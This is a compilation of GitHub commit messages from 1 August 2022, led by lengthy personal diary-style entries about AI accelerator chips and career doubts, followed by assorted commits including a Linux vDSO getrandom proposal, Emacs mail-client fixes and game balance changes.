There are things I could have done to make things go better, that do not necessarily have anything with the learning algorithm itself.

7:55am. Poker botting was a means to an end. Doing it on CPU + GPUs means nothing to me by itself. Doing it without the use of ML would not be meaningful. I picked that path to specifically cultivate my ML skills.

I am not saying that I will do the above or that I want to do it. But that is what I think will happen simply due to how deep this insanity runs in me.

8am. Yeah, it runs really deep. I keep saying I'll trick those dumb HR drones, but this whole time I've essentially been applying to the AI chip job despite my stated wishes of wanting money. Remember when I got that surprise sponsorship offer by Strong Compute. Those were really desperate for a ML guy, but Spiral itself is not my weak point. If they had bullshit something like 'Sure, we are interested in AI chips. But they are hard to get right now. We'd make it a priority to switch to them once they arrive, but for now how do you feel about using vanilla hardware?'

If they had told me something like that, then I do not know what would have happened. What sort of crazy thing would my obsession have me do?

Despite how obsessed I am, I am not sure I'd want a job at the AI chip companies. I want work actually using them. It is kind of like the difference between being a soldier and a gun manufacturer, or a swordsman and smith.

It is true that I applied to some of them last year, but me and jobs do not exactly have a sane, sensible relationship. I seem to be completely clueless as to what my own motivations are.

I guess now that I've actually gone to a few intro interviews, and understand that HR drones prioritize gauging interest, it revealed something to me. Maybe I did gain something from this attempt. In the last year's round of applications, I never went beyond being given HackerRank shit from the 10% of the drones that did not chuck my resume into the basket, but at place at Kalepa I was allowed to skip that stage and go forward to having a talk with recruiters.

8:15am. My reasoning is that I should want money for all sorts of good things. It is simply a sane way of looking at it. It is how a sensible person would do it. I told myself that is what I want. But I guess before I can trick the recruiters, I should first work on tricking myself.

8:20am. Hmmm, maybe I have been obsessed from the start. I mean, the reason why I created Spiral was so I could serve as a language for AI chips. This motivation goes years back. I never believed in CPUs and GPUs from the start. Ever since I wrote Simulacrum I've had a desire to grasp the brain cores and extract their power. For me a language is just a tool that would allow me to do it. So I prioritized making a language and told myself that I'll make money via poker to make up for it. This later thing was merely a goalpost, not the actual reason for making the language.

8:25am. Before recently, the cloud was not in my eyes, but now that I've come to understand that it is my only choice of scaling - and thank to my RL/3d experience, I realized that I really hate doing training runs on my own rig, so it sparked that desire.

I got my ass handed to me so hard in late 2021, so it is late to realize that it exists, but it better than never.

Right now, I am not really looking forward to trying out Graphcore's chips. I don't really believe in the current generation of such devices. But do I really believe that once I get access, that I won't be studying the manual looking into how to program them?

What I am most afraid of currently?

It is not really that their performance might be poor. Rather I am afrain that their programability might not be high enough. For my plan to bear fruit I want to move the simulation code to the chip. If they end up being dumb ML accelerators rather than a paradigm shift in how computing is done, it will be hard to accomplish my goals.

8:35am. The reason I believe that is because will AI simply come about through the use of PyTorch. That can't be true. In the first place, you can only use deep learning libraries to do deep learning. This incredibly restricts your research scope and it is obvious that backprop cannot handle actual intelligence. So all the ML researchers focusing on it are just adding to the landfil of useless papers.

Tenstorrent says they are not a deep learning chip, but I won't believe these companies until I can try out their chips and see the programming model they are using for myself. I am feeling very skeptical of them.

8:45am. Yeah...I want a job in a company focusing on making use of AI chips. I do not care about the salary because I know that through the use of advanced AIs it will be easy to make tens of millions of dollars. This is why I can't get on board with accumulating wages and investing them.

In the review I wrote yesterday, I said that I was unsure of whether I'd be able to do the tasks at some random company despite my skills? Looking into myself it does not really feel that way when I think about programming AI chips. I've never touched them yet and have no experience with them, but I could confidently that absolutely nothing will stop me from accomplishing any given task once I have them.

If I felt that way about programming the CPU, I'd have a much easier time getting a job.

9am. I've just been confused...I think had proper ways of getting AI chips were there I'd have realized what my true desire way.

Imagine I had several job offers before me, 1 was to program an AI chip for some task, and one of the other was 200k for some business analytics applciation which I do not care about. I'd pick the later, and then delay the decision, and lose sleep, and lose sleep, and lose sleep. I'd keep thinking of how that first company is enthusiastic about trying out new hardware for the sake of ML research. I'd probably cave in, in the end.

9:05am. No, this is not about desire or wanting something. How long have I worked on Spiral for example? Was I having fun every step of the way? No, it was hard and difficult instead. Yet, I kept going for some reason.

That reason can only be called obsession. Desires come and go.

9:10am. I am wrong. I though that as I got older, I've matured, become hardworking and found my goals, but that is not it.

When I did the hard work of the past 7.5 years, and challenged the hardship, I thought that it was maturity, but that is not it. Old people are often useless and have long lost their drive. When I did what I didn't want to do, it was not because I've gone beyond being a child, but precisely because I was a child.

My deep obsession towards my path is what kept me going. It overruled all the minor pains and objections.

9:25am. Going back to the 50k ai chip vs 200k business analytics job. I need to understand that what I desire is ease and money. What I want is the later. But what I am obsessed about is the former. I'll only be able to make progress once I acknowledge this obsession. I should find a way to work with it. I should also come to term with my arrogance. I'd loathe doing favors to randos for low reward which is what freelancing is.

9:35am. I am obsessed...and since last year, I've lost the proper outlet for that obsession.

9:40am. Apart from doing the C backend, last month really sucked. But I did a good thing by getting my accounts in order.

I think I do want to program. I was wounded and art gave me an outlet, but now...

9:45am. Yeah, obsession is different from desire and I need to accept and work with it. Money is secondary.

What I want to do now is make sure of the programming models for the AI chips.

There is no way around it. I need to check whether I could implement a poker game or a genetic programming system, on the Graphcore IPU or the TensTorrent chip. Once I have that I will know here the path points to. If it turns out the chips can do what I want, then that means the jobs involving them would be far more attractive to me.

Though neuromorphic, the requirements of an AI chip and the brain are different. The brain was designed by nature and already has algorithms built into it. But what I'd want in an AI chip is the capability for to program it so it can infer it own algorithm.

This should be possible if they are just localized CPUs + GPUs. If they are something like Intel's Loihi, then it would not be possible at all.

It is the same situation as airplanes vs birds. There are different paths towards getting to the same capability.

I need to look at it from the future, and consider the case - what if intelligence is in fact easy to do? Easy in the same was as getting a car is easy if you have the money to buy it. If you don't then all you can do is stare at them in the lot. Right now, I and the rest of the community might be in the later position. The impression given is that getting a car is really hard, and you need to do all sorts of weird things to get halfway the transporation capability using other devices.

9:55am. Being able to infer your own algorithm is important for not just achieving parity with the brain, but exceeding it. Who is to say that there is some optimal data transformation for processing the widest array of inputs.

10:10am. ...Damn it, let me check something out. When I registered for Graphcore cloud, they sent me some links to the SDK. Let me spend some time looking at it.

https://docs.graphcore.ai/en/latest/?utm_campaign=Graphcloud%20Announcement%20&utm_medium=email&_hsmi=108027897&_hsenc=p2ANqtz--4LI3qlJ_iAh2kvypjWdaJ6UdhBMFEsbhBZYTw5U1tYuK7LrFioi_5OHs6h5sZdOaEwwp5ZoI7coXhfe3kzI2Es7rwHw&utm_content=108027897&utm_source=hs_automation

https://groq.com/docs/

Groq has docs. If I really want a job programming these chips, there will be people in public places who I will be able to impress using my obsession. Getting a job should just involve showing sincerity to the right person.

10:15am. Let me read the year of the compiler at Groq. Does TensTorrent really not have any programming guides?

https://tenstorrent.com/faq/
> Documentation and reference designs can be found at docs.tenstorrent.com. Documentation includes User Guide or Quick Start Guide, datasheets, API guide, reference designs, errata, and changelogs.

Google is so useless. Why didn't it link me to the docs directly?

https://docs.tenstorrent.com/tenstorrent/

Let me read some of the stuff here. There is not much. It will be possible to program these things directly right?

https://docs.tenstorrent.com/tenstorrent/tenstorrent-pcie-cards/getting-started/sample-app/sample-app-explained

Don't they have any more impressive examples than this?

https://docs.tenstorrent.com/tenstorrent/tenstorrent-devcloud/getting-started/tether-details

> Tether is Tenstorrent's custom run-time tool which can be used to compile and run models on Tenstorrent hardware and feed data into the PCIe card and pull results out. In this release, Tether supports PyTorch and ONNX models as inputs. The release provides many sample models to test functionality.

This is really making me flacid. Who cares about running PyTorch models. Where is the programming guide?

> What ML frameworks are supported by your hardware?
> We have focused our efforts on Pytorch for now, but are capable of interfacing to other frameworks via ONNX. We also have a low-level C++ based programming framework called BUDA, and are able to run computations on NumPy arrays.

> How do I get started?
> Please contact us and we will direct you to the latest software stack and User Guide.

There is an email here. Right. This is the way to show sincerity...except the link is asking me for a password. It is not an email.

> Where do I find support if I need help?
> Support can come in two different ways.  You can navigate to the Tenstorrent Discord channel for community-driven support or you can email us at support@tenstorrent.com for individual-specific questions.

If I can't find the dev cloud using Google, maybe the support will tell me. Yeah, this is a path towards getting what I want. What I am feeling now is going to that discord channel and showing the people there Spiral. Remember when I made those posts on Reddit? I simply wasn't looking hard enough back then.

10:50am. Going through the application process make it seem like getting an in is a binary thing, but real world accumulation is more like a gradual process.

11am. I need to be putting myself out there.

Yeah, I need to give this a try. If those people turn out to be interested in a PL expert and a FPL like Spiral, then that is great. But in order to satisfy this obsession of my rather than letting it linger and fester in my heart, I should study the programming models of these AI chips and determine whether they would be suitable for implementing what I had in mind. If it turns out that it is not the case, then I might as well go into writing, freelancing and whatever else. But if they are suitable I'll aim to get a job programming them.

This was actually the plan in early 2021, but then I got into poker botting. Afterwards I somehow forgot about it, or rather none of the public job postings appealed to me. I really need to speak to somebody in the field to ask whether the kinds of roles that I'd like exist. Going through the official channels is a roulette, but the unofficial ones are where I can direct where I could land.

11:05am. I do not necessarily care about selling people on Spiral. A thoughtful reject would give me valuable feedback. Because it is not like I want to do all this. I am not attached to Spiral to the point of loving it. It is just that I am obsessed about it.

11:10am. What I want is to get out of my current dark spot. If I had a concrete plan for how I could use these chips and knew what sort of programs were viable on them, that would illuminate the way forward for me as a programmer. Maybe the chips will turn out weak and my obsession will loosen its hold on me.

https://docs.tenstorrent.com/tenstorrent/learn-more/support

Oh, here is the support. It has the link to the Discord channel. Let me take a little break to mentally prep myself and then I'll get started.

11:20am. In fact, let me hold off for more than just a bit, so I can put the crazy posts of the last few days a bit down the tree where they won't be so visible. I can take some time to write today while I scheme on the side. Also, I've decided that I won't post the review on the PL sub thread. That is not what I need to do.

There was a sense of being lost, but as I said once, these chips will have a community around them. Customers will need people to program them, and not all of them will necessarily want PyTorch model jockeys. Now that I've decided that I want a particular role rather than to maximize my salary, that will allow me to put my all into social interaction. If I can be sincere, I can bring this to a conclussion. I need to find a way of making connections. Applying to companies on job boards is not the way to do this."

---
## [maikol-solis/doomemacs](https://github.com/maikol-solis/doomemacs)@[72b28a9b7f...](https://github.com/maikol-solis/doomemacs/commit/72b28a9b7f3c740e101d488cc724ea31239a7c71)
#### Monday 2022-08-01 11:52:22 by TEC

fix(mu4e): support mu 1.8

Thanks to some combination of ignorance and obstinance, mu4e has thrown
compatibility to the wind and completely ignored the exitance of
define-obsolete-function-alias. Coupled with the inconsistent/partial
function renaming, this has made the mu4e 1.6⟶1.8 change particularly
annoying to deal with.

By suffering the pain of doing the mu4e author's work for them, we can
use defalias to give backwards compatibility a good shot for about 60
functions. Some mu4e~x functions are now mu4e--x, others are unchanged,
and then you've got a few odd changes like mu4e~proc -> mu4e--server and
mu4e-search-rerun. The form of message :from entries has also changed,
and a new (mu4e) entrypoint added supplanting mu4e~start.

Fix: #6511
Close: #6549
Co-authored-by: Rahguzar <aikrahguzar@gmail.com>

---
## [BSData/horus-heresy](https://github.com/BSData/horus-heresy)@[26d54434f4...](https://github.com/BSData/horus-heresy/commit/26d54434f495e6a3b77ab1b3ae097381fd1485eb)
#### Monday 2022-08-01 12:11:41 by Nikola Beo

WLTs and Shrapnel

[Added]
- Generic WLTs
- Legion-specific WLT placeholders
- WLT SEG added to generics (Praetors, Centurion)
- Graviton and Shrapnel weapons to all relevant models (I'm dead inside after needing to handle such needlessly picky formatting from GW)
- To facilitate Shrapnel Pistols, I added a Bolt Pistol Options SEG to several generic units

[Changed]
- Master of the Legion; now a separate SE that checks for 1 instance per 1k pts
- Added MotL to all relevant characters
- Mandatory generic WLTs handled as links to single WLT rather than SEG (Only done for IW characters, but can easily be duplicated for others)
- Mandatory non-generic WLTs only constrained by Min/Max 1 Warlord (didn't think it was relevant to make their specific WLTs also constrained as only one Warlord can be chosen at a time afaik)
- Reformatted Palatine Blades to fit Tactical template (Min X, decrement X, repeat X for models)
- Reformatted Centurion weapon options to cut down on clutter and bring in line with recent discussions/other entries
- Some fairly serious changes to Veterans to force checks on TLC and basic unit choice. I might honestly suggest formatting them more like Termies; as much I hate how clunky it is, there does not seem to be another way to force model integrity. The other option is completely ignoring the book's format and formatting it the way Recon Squads and several others currently are; please advise.

Pretty sure I missed some Shrapnel/Graviton options in some places, but I'm very tired and can deal with them when someone points them out.

---
## [zx2c4/linux-rng](https://github.com/zx2c4/linux-rng)@[352e853443...](https://github.com/zx2c4/linux-rng/commit/352e85344386bb54dc19717319667b114cff5082)
#### Monday 2022-08-01 13:32:49 by Jason A. Donenfeld

random: implement getrandom() in vDSO

Two statements:

  1) Userspace wants faster cryptographically secure random numbers of
     arbitrary size, big or small.

  2) Userspace is currently unable to safely roll its own RNG with the
     same security profile as getrandom().

Statement (1) has been debated for years, with arguments ranging from
"we need faster cryptographically secure card shuffling!" to "the only
things that actually need good randomness are keys, which are few and
far between" to "actually, TLS CBC nonces are frequent" and so on. I
don't intend to wade into that debate substantially, except to note that
recently glibc added arc4random(), whose goal is to return a
cryptographically secure uint32_t. So here we are.

Statement (2) is more interesting. The kernel is the nexus of all
entropic inputs that influence the RNG. It is in the best position, and
probably the only position, to decide anything at all about the current
state of the RNG and of its entropy. One of the things it uniquely knows
about is when reseeding is necessary.

For example, when a virtual machine is forked, restored, or duplicated,
it's imparative that the RNG doesn't generate the same outputs. For this
reason, there's a small protocol between hypervisors and the kernel that
indicates this has happened, alongside some ID, which the RNG uses to
immediately reseed, so as not to return the same numbers. Were userspace
to expand a getrandom() seed from time T1 for the next hour, and at some
point T2 < hour, the virtual machine forked, userspace would continue to
provide the same numbers to two (or more) different virtual machines,
resulting in potential cryptographic catastrophe. Something similar
happens on resuming from hibernation (or even suspend), with various
compromise scenarios there in mind.

There's a more general reason why userspace rolling its own RNG from a
getrandom() seed is fraught. There's a lot of attention paid to this
particular Linuxism we have of the RNG being initialized and thus
non-blocking or uninitialized and thus blocking until it is initialized.
These are our Two Big States that many hold to be the holy
differentiating factor between safe and not safe, between
cryptographically secure and garbage. The fact is, however, that the
distinction between these two states is a hand-wavy wishy-washy inexact
approximation. Outside of a few exceptional cases (e.g. a HW RNG is
available), we actually don't really ever know with any rigor at all
when the RNG is safe and ready (nor when it's compromised). We do the
best we can to "estimate" it, but entropy estimation is fundamentally
impossible in the general case. So really, we're just doing guess work,
and hoping it's good and conservative enough. Let's then assume that
there's always some potential error involved in this differentiator.

In fact, under the surface, the RNG is engineered around a different
principal, and that is trying to *use* new entropic inputs regularly and
at the right specific moments in time. For example, close to boot time,
the RNG reseeds itself more often than later. At certain events, like VM
fork, the RNG reseeds itself immediately. The various heuristics for
when the RNG will use new entropy and how often is really a core aspect
of what the RNG has some potential to do decently enough (and something
that will probably continue to improve in the future from random.c's
present set of algorithms). So in your mind, put away the metal
attachment to the Two Big States, which represent an approximation with
a potential margin of error. Instead keep in mind that the RNG's primary
operating heuristic is how often and exactly when it's going to reseed.

So, if userspace takes a seed from getrandom() at point T1, and uses it
for the next hour (or N megabytes or some other meaningless metric),
during that time, potential errors in the Two Big States approximation
are amplified. During that time potential reseeds are being lost,
forgotten, not reflected in the output stream. That's not good.

The simplest statement you could make is that userspace RNGs that expand
a getrandom() seed at some point T1 are nearly always *worse*, in some
way, than just calling getrandom() every time a random number is
desired.

For those reasons, after some discussion on libc-alpha, glibc's
arc4random() now just calls getrandom() on each invocation. That's
trivially safe, and gives us latitude to then make the safe thing faster
without becoming unsafe at our leasure. Card shuffling isn't
particularly fast, however.

How do we rectify this? By putting a safe implementation of getrandom()
in the vDSO, which has access to whatever information a
particular iteration of random.c is using to make its decisions. I use
that careful language of "particular iteration of random.c", because the
set of things that a vDSO getrandom() implementation might need for making
decisions as good as the kernel's will likely change over time. This
isn't just a matter of exporting certain *data* to userspace. We're not
going to commit to a "data API" where the various heuristics used are
exposed, locking in how the kernel works for decades to come, and then
leave it to various userspaces to roll something on top and shoot
themselves in the foot and have all sorts of complexity disasters.
Rather, vDSO getrandom() is supposed to be the *same exact algorithm*
that runs in the kernel, except it's been hoisted into userspace as
much as possible. And so vDSO getrandom() and kernel getrandom() will
always mirror each other hermetically.

API-wise, vDSO getrandom has a pair of functions:

  ssize_t getrandom(void *state, void *buffer, size_t len, unsigned int flags);
  void *getrandom_alloc([inout] size_t *num, [out] size_t *size_per_each);

In the first function, the return value and the latter 3 arguments are
the same as ordinary getrandom(), while the first argument is a pointer
to some state allocated with getrandom_alloc(). getrandom_alloc() takes
the desired number of states, and returns an array of states, the number
actually allocated, and the size in bytes of each one, enabling a libc
to use one per thread. We very intentionally do *not* leave state
allocation up to the caller. There are too many weird things that can go
wrong, and it's important that vDSO does not provide too generic of a
mechanism. It's not going to store its state in just any old memory
address. It'll do it only in ones it allocates.

Right now this means it's a mlock'd page with WIPEONFORK set. In the
future maybe there will be other interesting page flags or
anti-heartbleed measures, or other platform-specific kernel-specific
things that can be set. Again, it's important that the vDSO has a say in
how this works rather than agreeing to operate on any old address;
memory isn't neutral.

The interesting meat of the implementation is in lib/vdso/getrandom.c,
as generic C code, and it aims to mainly follow random.c's buffered fast
key erasure logic. Before the RNG is initialized, it falls back to the
syscall. Right now it uses a simple generation counter to make its
decisions on reseeding; this covers many cases, but not all, so this RFC
still has a little bit of improvement work to do. But it should give you
the general idea.

The actual place that has the most work to do is in all of the other
files. Most of the vDSO shared page infrastructure is centered around
gettimeofday, and so the main structs are all in arrays for different
timestamp types, and attached to time namespaces, and so forth. I've
done the best I could to add onto this in an unintrusive way, but you'll
notice almost immediately from glancing at the code that it still needs
some untangling work. This also only works on x86 at the moment. I could
certainly use a hand with this part.

So far in my test results, performance is pretty stellar (around 15x for
uint32_t generation), and it seems to be working. But this is very, very
young, immature code, suitable for an RFC and no more, so expect
dragons.

Cc: linux-crypto@vger.kernel.org
Cc: x86@kernel.org
Cc: Nadia Heninger <nadiah@cs.ucsd.edu>
Cc: Thomas Ristenpart <ristenpart@cornell.edu>
Cc: Theodore Ts'o <tytso@mit.edu>
Cc: Vincenzo Frascino <vincenzo.frascino@arm.com>
Cc: Adhemerval Zanella Netto <adhemerval.zanella@linaro.org>
Cc: Florian Weimer <fweimer@redhat.com>
Cc: Linus Torvalds <torvalds@linux-foundation.org>
Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>

---
## [Takahiru/Yogstation](https://github.com/Takahiru/Yogstation)@[5bbc6a2401...](https://github.com/Takahiru/Yogstation/commit/5bbc6a2401361e71f4c6fb0ad173900153603787)
#### Monday 2022-08-01 13:48:49 by Marmio64

Sinful demon changes + re-enable (#14345)

* first wave of demon changes

many changes
1: gluttonous demons hunger 3x as fast as normal people
2: all demons no longer enter softcrit (still can enter hardcrit), are geneless, dont suffocate in crit, and have stable hearts.
3: true demon form deals 20 damage instead of 24 (wrath is 24 instead of 28). Health is lowered to 160 and health regen per hit is now 8 instead of 10. To compensate, they are ever so slightly faster, but are still slower than everyone but podpeople. Demons also lose 2 hp every life tick (a life tick is generally 2 seconds, so 2 hp every 2 seconds), so as to try to deter you from staying in demon form the entire round.
4: objectives are made a bit less murderbone-ey.
5: sinful demon spawns slightly less often

* re enables event

* fixes

* removes chance for envy to get an identity theft objective

* word change

* sinful demon is rarer still

honestly, they arent very interesting if they happen too much, so i'd like them to mildly rare

Co-authored-by: Jamie D <993128+JamieD1@users.noreply.github.com>

---
## [DEFRA/water-abstraction-ui](https://github.com/DEFRA/water-abstraction-ui)@[606fadd94e...](https://github.com/DEFRA/water-abstraction-ui/commit/606fadd94e661f4634682b45637b859e0d1f7773)
#### Monday 2022-08-01 14:36:09 by Alan Cruikshanks

Tidy up .../billing/services/transactions-csv.js (#2120)

https://eaflood.atlassian.net/browse/WATER-3586

We came across transactions-csv.js as part of working on altering the bill run download to handle SROC bill runs.

To say it angered and upset the current dev team is a bit of an understatement. You _could_ argue calling a function to pull a couple of fields from an object has value (though in our opinion you'd be wrong!)

But there is no reason for making an _utter_ mess of known conventions around `private` and `public` methods. It is a [common practice](https://stackoverflow.com/a/4484449/6117745) in JavaScript to prefix private module methods with an underscore. This singles intent to other developers; these methods are only used internally by the module, and those without it are for use elsewhere in the code.

So, after another day of struggling through the code imagine our consternation when we come across this

```javascript
exports._getInvoiceData = getInvoiceData
exports._getInvoiceAccountData = getInvoiceAccountData
exports._getTransactionData = getTransactionData
exports._getTransactionAmounts = getTransactionAmounts
exports.createCSV = createCSV
exports.getCSVFileName = getCSVFileName
```

We are making `private` methods `public` but when we do so we are identifying them as `private`. Arrrrgh!!! 🤬😠

As far as we can see this was _solely_ for the purpose of testing the methods. _They are not referenced anywhere else!!!_ So, added to our convention-breaking we're also directly testing methods intended to be private and making them public purely to allow those tests to run. 🤯🤦

We have no words. Just know this change attempts to make things a little better 🥹

---
## [kursor1337/ChroniclesOfWW2-kt](https://github.com/kursor1337/ChroniclesOfWW2-kt)@[b0b33a71ad...](https://github.com/kursor1337/ChroniclesOfWW2-kt/commit/b0b33a71ad78845f75d094d7c08c94ec126f0fd7)
#### Monday 2022-08-01 15:42:23 by kursor

trying to fix white screen when navigating to SinglePlayerGameActivity.kt
yeah
i hate my life

---
## [mrakgr/The-Spiral-Language](https://github.com/mrakgr/The-Spiral-Language)@[95aa409453...](https://github.com/mrakgr/The-Spiral-Language/commit/95aa409453a710ae217573971ad5f9b4be718315)
#### Monday 2022-08-01 16:21:48 by Marko Grdinić

"3:55pm. https://techcrunch.com/sponsor/g-core-labs/accelerate-ai-ml-with-the-new-ipu-based-cloud-platform-by-g-core-labs-graphcore/

I am going through the news trying to get a sense of how old Graphcore's cloud offering is.

`<meta name="sailthru.date" content="2022-07-14 11:54:45" />`

There isn't a published date in the article, but I found this in the source.

`"dateCreated":"2022-07-14T18:54:45Z","datePublished":"2022-07-14T18:54:45Z","dateModified":"2022-07-15T17:40:17Z"`

So it was only published two weeks ago.

Thanks to this, I can conclude that Graphcore's cloud is new.

https://cirrascale.com/graphcloud.php

Holy shit these prices are huge.

3k a week? 20$/h. It is like I am made of gold.

> * Cirrascale Cloud Services does not provide servers by the hour. The "hourly equivalent" price is shown as a courtesy for comparison against vendors like AWS, Google Cloud, and Microsoft Azure.

Don't tell me I have to rent it for something like an entire week?

https://www.enterpriseai.news/2021/01/29/graphcore-ipu-gets-a-public-cloud-boost/

Actually, it was from a while ago. So the Graphcore cloud has been there for a while.

4:05pm. Anyway, the plan I've been toying in my mind is to make a Graphcore & Tenstorrent backends and run a little game on them. Well, not a little, but Texas Holdem. I could also make a Python backend. I could then use that to advertize and seek out sponsors. 'Look how easy it is to program these chips in Spiral. This is the power of functional programming with partial evaluation.'

It would be a lot of work, but it would be fun to do. But the above prices are simply prohibitive.

Is my quest going to end here? At this rate, I am simply going to get priced out of the Singularity. Isn't there anything I can do here?

https://www.youtube.com/results?search_query=interview+practcie

I am going to put some effort into studying this just in case.

https://www.youtube.com/watch?v=srw4r3htm4U
Job Interview Simulation and Training - Mock Interview

Let me watch this.

...Actually nevermind that for now. I do not feel like simulating interviews.

4:20pm. Maybe the cloud platform by G-Core is something other than Cirrascale and it might be cheaper.

4:25pm. There is no way around it. After I've gotten a good night's rest, I will go into the TensTorrent discord and do the following.

* Ask whether I could take a look at the docs despite not being a customer yet. Note that I am interested in how their chip could be programmed at a low level. Explain the `Question To A Machine` proposal.
* Ask whether they'd be interested in a functional programming language such as Spiral to replace C++ and show it to them. Touch upon the benefits it has. Ask whether they have any customers who are using it for purposed other than purely deep learning and are interested in the simulation capabilities of the chip.
* Ask whether they'd be interested in hiring a functional PL expert such as myself.
* Tell them I'd be interested in implementing a Spiral backend for the TensTorrent chip as well as a demo to showcase it. It will be the Texas Holdem game. I'll try to implement the training process as well and test how many hands per second that gets me.

4:50pm. Hmmmm...I'll try that. But if that fails, I am not sure what I'll want to do. Writing after all?

My interest in regular programming tasks is nil. It is easy to come up with a plan as if it were a game:

* Grind freelancing.
* Practice interviewing.
* Apply to jobs.

And so on. This is how I'd guide a player character here. But subjectively, I am always operating at the limit of my will.

5pm. I want to write, and I want to program, but I can't do both.

Maybe after finishing that C backend, I've already peaked as a programmer? I feel really lame to end the journey like this - by expending my willpower and retreating into the land of dreams. Considering I want to cause the Singularity, you'd imagine such a person would continue pushing forward forever until he gets his way, instead of accepting the encroaching demise.

5:10pm. In this situation what I really want to do is grind AI chip related apps. If I wanted to be a regular programmer, I'd make vanilla apps. The kinds of programs I am interested in are RL agents and simulations on AI chips. But I can't think of a way to turn profit on those?

Short term financial trading? I do not have the capital to start that. And even so I am not interested in short term trading, but longer term.

There are just so many things you can do in this world, it is maddening. It is not like in a static game where you are invited to do all the side quests.

5:15pm. It is not actually such a bad thing to try writing for 6 months or a year. If try it and get no success, I can take it as a sign that there is no point in me being a writter. That would make regular programming jobs attractive.

Right now I am 35. If I write for a year or two, I'll still have two decades to apply myself as a human programmer. Maybe I could keep going till I am 70 or even 80 even.

I think a decade of programming would be enough to wipe away my shame. I'll get a junior position somewhere, even locally if need be, and work my way up from there.

5:20pm. It depends whether I can get to 1k/month as a writter which is the average yearly wage in Croatia.

It is a risk, everything is a risk.

Compared to 2014, my art skill really is better so I won't have trouble with the covers again.

5:40pm. It is not the end of my life, but it is the end of my path a solo dev. If I want resources and money I need to turn pro.

I'll forget the pride of 6.5 years of struggle on my own and start from the ground up. It will be like an adult going to kindergarden, but I have to start somewhere and that somewhere will have to be at the bottom whether that means freelancing or junior wage positions. I won't aim for senior right off the bat. I can laugh at those midwit senior Googlers who don't understand linked lists, but they have a point that this is not used professionally, and I do not know what is. I have to acknowledge this weakness of mine. They might not have programming skills, but they do have what I don't.

5:45pm. Either I step on the path of a pro visual novelist or a pro developer.

I am going to decide that soon. That trip to the Discord will decide it for me.

I'll step on the pro programmer path working on AI chips or I will write stories about the Singularity.

If that Discord is just one guy doing tech support then that is fine, I guess I'll go the novelist route. But if it turns out there are active conversations about the use of TensTorrent's chips by a community, I will have a possibility of making something of Spiral.

TensTorrent is probably the only choice. Graphcore's prices are extremely high, I can't imagine it being used for anything but deep learning.

6:10pm. I think the scenario is highly likely that I'll go the novelist route. My luck when it comes to programming was always bad. Nothing good has happened to me in programming.

6:15pm. Let me close here. Tomorrow I will do a write up for the TensTorrent discord and take the plunge. After that I'll take a break, and most likely begin writing for real.

Sigh, I remember when I stopped writing Simulacrum in 2014. I was so sad to leave it in favor of programming. I'll be similarly sad to leave programming behind too. But I'll be back at some point if I am able. When I was 27, my succeesses during my schooldays and my talent summoned me back to it after a decade and half of absence.

Maybe Spiral will be calling me back at some point too."

---
## [nikothedude/sojourn-station](https://github.com/nikothedude/sojourn-station)@[ef4665ec90...](https://github.com/nikothedude/sojourn-station/commit/ef4665ec90474cf5ac5f6aff34b6fd30e365429d)
#### Monday 2022-08-01 16:48:06 by DimmaDunk

I HATE LIVERMED, I HATE LIVERMED, I HATE LIVERMED!!! (#3714)

* Makes combat medical kits better

- Replaces Dylovene pill bottle on Combat Medical Kit with Carthatoline pill bottle, as every chem inside it already WAS an upgrade over their normal counterparts, making it better at halting toxins damage and preventing liver from killing you. Also adds a Sanguinum syrette to stave off massive bloodloss which would cause the former as well.
- Replaces one of the Quicklot syrettes with a Sanguinum syrette on the Oxygen Deprivation First Aid Kit for better treatment of causes of oxyloss.
- Standardizes pill icons based on chem colors across all pre-built pills for easier reognition.
- Guarantees the "skill issue/salt PR" tag since it doesn't fix underlying issues of current medical system

* Adds carthatoline pills to deferred and corpsman large kit

Keeping in line with the rest of the PR.

* Blood regen pills!

- Adds pre-made Ferritin-Hemosiderin pills composed of iron and protein to help regenerate lost blood
- Replaces Sanguinum syrette on combat kit with ferritin-hemosiderin pill bottle
- Combat surgery kits now really hold advanced tools (except bone gel since the adv version is Soteria made)
- Makes the advanced bone gel item description not a copypaste of its stock counterpart

* Forgot a comma

Damn my haste.

---
## [united-meows/yystal](https://github.com/united-meows/yystal)@[62d320e13d...](https://github.com/united-meows/yystal/commit/62d320e13d8ba46b4e1a89971174e4bbd899df34)
#### Monday 2022-08-01 17:53:06 by ghost2173

i hate @slowcheet4h

have this shitty formating

i hate that you ignore important exceptions

fuck you

---
## [user-grinch/Cheat-Menu](https://github.com/user-grinch/Cheat-Menu)@[78b409d015...](https://github.com/user-grinch/Cheat-Menu/commit/78b409d01544e6c76c6cd993f48ff737fd82eff2)
#### Monday 2022-08-01 17:56:10 by 3Qyou

Add support for Chinese

* Create 简体中文

* Update 简体中文

I retranslated the latest version of the text. I really hope to see the language of my country soon. Can I advertise this modifier on the video platform after the update? I will indicate the author, the ownership of the author and the original address of this modifier. I hope you can agree. My English is not very good, if there are some grammatical errors, please forgive me! I really mean no harm.

* Add files via upload

I'm sorry, it's my first time to participate in translation, which has caused you a little trouble. I have corrected it again. Because my English is not very good, some texts have not been translated. I don't know if I can upload some of them in the way of translation, and keep the rest in the original.

---
## [FlacoFF/FIJ_Foundation-19](https://github.com/FlacoFF/FIJ_Foundation-19)@[ea904cd81f...](https://github.com/FlacoFF/FIJ_Foundation-19/commit/ea904cd81f16d6feb161b0dbd24eca7524df15ab)
#### Monday 2022-08-01 18:12:24 by Calyxman

Makes Crisis robot actually worth using. (#576)

* Adds adrenaline to paramedic borg hypospray

Kinda weird how the robot whos meant to be doing paramedic shit doesnt have shit to restart the heart or apply allergic reaction first aid???
Adds /datum/reagent/medicine/adrenaline to the crisis borghypo.

* Adds ATK, ABK to Crisis Cyborg

Adds the advanced trauma and burn kits to the Crisis cyborg. This makes it a direct tradeoff between Crisis and Emergency Response flying. ER has more mobility, but worse gear for medical treatment, while the Crisis cyborg has less mobility but better gear.

* Adds tylenol and dexalin to crisis borg

Why tf does the surgical borg, specializing in surgical procedures, have better equipment for the medical doctor job than the actual medical cyborg?
Tradeoff between Emergency Response and Crisis: Crisis has lower mobility, but better gear, and Emergency Response has higher mobility but worse gear.

---
## [rakeshrgvn/linuxkit](https://github.com/rakeshrgvn/linuxkit)@[860934d5d9...](https://github.com/rakeshrgvn/linuxkit/commit/860934d5d98f0024ebc86896715863526f8fe96c)
#### Monday 2022-08-01 18:28:42 by Davide Brini

New output format: iso-efi-initrd

This option was previously not available and required postprocessing of a `tar-kernel-initrd` output.

Comparison with `iso-efi`:

